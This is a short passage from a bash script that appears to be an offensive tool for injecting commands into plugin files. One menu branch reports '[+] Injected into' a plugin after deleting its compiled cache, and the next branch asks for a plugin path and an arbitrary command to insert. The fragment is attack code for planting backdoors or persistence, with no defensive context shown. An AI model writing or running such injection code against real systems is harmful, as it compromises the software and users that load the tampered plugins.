            rm -f "${PF}c" 2>/dev/null; echo -e "${GREEN}[+] Injected into ${PF}${NC}" ;;
        2)
            read -p "Plugin path: " PF; read -p "Command: " CMD
            [[ -f "$PF" ]] || { echo "[-] Not found"; return; }
